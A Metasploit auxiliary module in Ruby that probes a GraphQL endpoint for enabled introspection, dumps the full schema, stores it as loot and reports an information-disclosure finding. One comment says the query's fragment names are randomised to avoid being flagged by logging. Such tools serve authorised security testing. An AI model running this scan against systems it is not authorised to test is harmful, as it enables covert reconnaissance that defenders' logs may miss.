##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GraphQL Introspection Scanner',
        'Description' => %q{
          This module queries a GraphQL API Endpoint to retrieve schema data by using
          introspection, if it is enabled on the server. This module works on all GraphQL versions.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sjanusz-r7', # Metasploit module
        ],
        'References' => [
          [ 'URL', 'https://portswigger.net/web-security/graphql' ],
          [ 'URL', 'https://graphql.org/learn/introspection/' ]
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Base path of the GraphQL endpoint', '/'])
    ])
  end

  # Values that can be matched against to verify that introspection is not enabled on the server.
  # @return [Array<Regex>] An array of regular expressions
  def introspection_not_enabled_values
    [ /introspection is not (allowed|enabled)/i, /the query contained __schema/i, /to enable introspection/i ]
  end

  # Check if the response received from the server suggests that introspection is enabled on the server, by comparing it
  # to a known good value.
  # @param response The response received from the server.
  # @return [TrueClass|FalseClass] True if the response matched a known introspection result, false otherwise.
  def responded_with_introspected_data?(response)
    return false if introspection_not_enabled_values.any? { |regex| response&.body.to_s.match?(regex) }

    # Known good response
    response&.body.to_s == "{\"data\":{\"__schema\":{\"queryType\":{\"name\":\"Query\"}}}}\n"
  end

  # Create a small query, used to test if introspection is enabledo n the GraphQL endpoint.
  # @return [String] The processed introspection probe query.
  def introspection_probe_query
    <<~EOF
      query {
        __schema {
          queryType {
            name
          }
        }
      }
    EOF
  end

  # Create a unique query that will try to dump the GraphQL schema.
  # This dumps the data definitions, objects etc. not the data stored on the server.
  # Original query comes from: https://portswigger.net/web-security/graphql
  # @return [String] The processed schema dump query
  def schema_dump_query
    # Obfuscate the variable names with the hopes it will not get picked up by any logging solutions as suspicious.
    vars_map = {
      input_fragment: Rex::Text.rand_text_alpha(8),
      type_fragment: Rex::Text.rand_text_alpha(8),
      type_reference: Rex::Text.rand_text_alpha(8)
    }

    # Fragments need to be present at the end, outside the curly braces of the 'query'
    <<~EOF
      query {
        __schema {
          queryType {
            name
          }
          mutationType {
            name
          }
          subscriptionType {
            name
          }
          types {
            ...#{vars_map[:type_fragment]}
          }
          directives {
            name
            description
            args {
              ...#{vars_map[:input_fragment]}
            }
          }
        }
      }
      fragment #{vars_map[:type_fragment]} on __Type {
        kind
        name
        description
        inputFields {
          ...#{vars_map[:input_fragment]}
        }
        fields(includeDeprecated: true) {
          name
          description
          isDeprecated
          deprecationReason
          args {
            ...#{vars_map[:input_fragment]}
          }
          type {
            ...#{vars_map[:type_reference]}
          }
        }
        inputFields {
          ...#{vars_map[:input_fragment]}
        }
        interfaces {
          ...#{vars_map[:type_reference]}
        }
        enumValues(includeDeprecated: true) {
          name
          description
          isDeprecated
          deprecationReason
        }
        possibleTypes {
          ...#{vars_map[:type_reference]}
        }
      }
      fragment #{vars_map[:input_fragment]} on __InputValue {
        name
        description
        defaultValue
        type {
          ...#{vars_map[:type_reference]}
        }
      }
      fragment #{vars_map[:type_reference]} on __Type {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    EOF
  end

  # Report a GraphQL instance on the current host and port.
  # @return [Mdm::Service] The reported service instance.
  def report_graphql_service
    report_service(
      host: rhost,
      port: rport,
      name: (ssl ? 'https' : 'http'),
      proto: 'tcp'
    )
  end

  # Report a GraphQL Introspection vulnerability on the current host and port.
  # @return [Mdm::Vuln] The reported vulnerability instance.
  def report_graphql_vuln
    report_vuln(
      {
        host: rhost,
        port: rport,
        name: 'GraphQL Information Disclosure through Introspection',
        refs: references
      }
    )
  end

  # Report a GraphQL Introspection web vulnerability on the current host and port.
  # @param service The GraphQL Mdm::Service instance.
  # @param query The query string used to check for the web vulnerability.
  # @param response The reponse from the server, used as proof that the vulnerability can be exploited.
  # @return [Mdm::WebVuln] The reported web vulnerability instance.
  def report_graphql_web_vuln(service, query, response)
    report_web_vuln(
      {
        host: rhost,
        port: rport,
        ssl: ssl,
        service: service,
        path: normalize_uri(target_uri.path),
        query: query,
        method: 'POST',
        params: [
          [ 'data', query ]
        ],
        pname: 'path',
        proof: response.body,
        name: 'GraphQL Introspection',
        description: 'GraphQL endpoint has enabled introspection. This can lead to information disclosure',
        owner: self,
        category: 'Information Disclosure'
      }
    )
  end

  # Send out a GraphQL request to the current endpoint, with the provided query string.
  # @param query The query string to execute.
  # @return (see Msf::Exploit::Remote::HttpClient#send_request_cgi)
  def send_graphql_request(query)
    send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'POST',
      'ctype' => 'application/json',
      'headers' => {
        'Accept' => 'application/json'
      },
      'data' => JSON.generate({ query: query })
    )
  end

  # Process the errors array into a nice human-readable and formatted string.
  # @param errors An array of errors.
  # @return [String] A string with formatted error messages
  def process_errors(errors)
    return '' if errors&.empty?

    # APIs aren't consistent. Some have an error message, some have title & detail.
    # Match all the known cases so far, otherwise return the inspected value.

    errors.map do |error|
      "  - #{error['message'] || error['detail'] || error['description']}"
    end.join("\n") || ''
  end

  # Check if the current endpoint is vulnerable to GraphQL Introspection information disclosure.
  # @return [Exploit::CheckCode]
  def check
    query = introspection_probe_query
    res = send_graphql_request(query)

    if res.nil?
      return Exploit::CheckCode::Unknown('The server did not send a response.')
    end

    case res.code
    when 200
      graphql_service = report_graphql_service
      report_graphql_vuln
      report_graphql_web_vuln(graphql_service, query, res)

      return Exploit::CheckCode::Vulnerable('The server has introspection enabled.')
    when 400
      parsed_body = JSON.parse!(res.body)
      error_messages = process_errors(parsed_body['errors'] || Array.wrap(parsed_body['error']))
      safe_message = "The server responded with an error status code and the following error(s) to the introspection request:\n#{error_messages}"
      return Exploit::CheckCode::Safe(safe_message)
    when 403
      # Don't report the GraphQL service here, as this could be a generic 'No Access', so we are not sure if the GraphQL
      # endpoint exists or not.
      return Exploit::CheckCode::Unknown('The server did not allow access to the GraphQL endpoint.')
    when 422
      # Rails application missing a CSRF token would return 422, but we are not 100% sure if this is a GraphQL endpoint.
      return Exploit::CheckCode::Unknown('The server required a CSRF token.')
    else
      # We are not 100% sure that the service is a GraphQL endpoint. It could be a generic 403 Access Denied.
      return Exploit::CheckCode::Unknown('The server is online, but returned an unexpected response code.')
    end
  end

  # Attempt a schema dump request against a GraphQL endpoint
  # @return [nil]
  def run
    query = schema_dump_query
    res = send_graphql_request(query)

    if res.nil?
      print_error("#{rhost}:#{rport} - The server did not send a response.")
      return
    end

    if res.code == 200
      print_good("#{rhost}:#{rport} - Server responded with introspected data. Reporting a vulnerability, and storing it as loot.")
      graphql_service = report_graphql_service
      report_graphql_vuln
      report_graphql_web_vuln(graphql_service, query, res)
      store_loot('graphql.schema', 'json', rhost, res.body, 'graphql-schema.json', 'GraphQL Schema Dump', graphql_service)
    else
      parsed_body = JSON.parse!(res.body)
      if parsed_body.include?('errors') || parsed_body.include?('error')
        print_error("#{rhost}:#{rport} - Server encountered the following error(s) (code: '#{res.code}'):\n#{process_errors(parsed_body['errors'] || Array.wrap(parsed_body['error']))}")
      else
        print_error("#{rhost}:#{rport} - Server replied with an unexpected status code: '#{res.code}'")
      end
    end
  end
end
